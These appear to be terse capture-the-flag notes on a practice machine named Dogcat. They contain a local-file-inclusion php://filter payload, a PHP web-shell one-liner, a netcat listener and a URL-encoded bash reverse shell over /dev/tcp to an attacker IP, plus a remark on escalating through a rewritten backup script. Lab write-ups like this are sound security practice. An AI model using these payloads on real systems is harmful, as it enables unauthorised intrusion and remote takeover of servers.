### Dogcatvm

10.10.185.221

## nmap

#ssh
OpenSSH 7.6p1

#tcp
Apache/2.4.38

parameter view is local file inclusion
# file inclusion filter base64
php://filter/convert.base64-encode/resource=cats/../index

#inject php reverse shell

<?php system($_GET['cmd']); ?>

# reverse shell

(nc listen: `sudo nc -l 1234`)
%26: &

http://<box-ip>/test.php?cmd=echo "<?php exec('/bin/bash -c \'bash -i >%26 /dev/tcp/<my-ip>/1234 0>%261\'');?>" > test2.php

# /opt/backup

backup sh file, rewrote and got second shell